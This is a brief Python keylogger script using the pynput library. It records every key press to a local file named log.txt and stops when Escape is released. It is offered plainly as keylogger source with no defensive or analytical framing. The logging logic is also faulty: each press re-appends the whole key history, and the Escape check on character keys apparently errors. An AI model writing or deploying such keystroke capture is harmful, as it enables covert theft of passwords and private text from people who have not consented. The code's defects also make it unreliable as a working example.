#This is a normal Keylogger with the Python
from pynput.keyboard import Listener, Key

keys=[]

def write_to_file(keys):
    with open("log.txt","a") as f:
        for i in keys:
            a = str(i).replace("'",'')
            f.write(a)
            f.write(',')

def on_press(key):
    keys.append(key)
    write_to_file(keys)

def on_release(key):
    if key == key.esc:
        return False

# Start the listener for key presses
with Listener(on_press=on_press,on_release=on_release) as l:
    l.join()
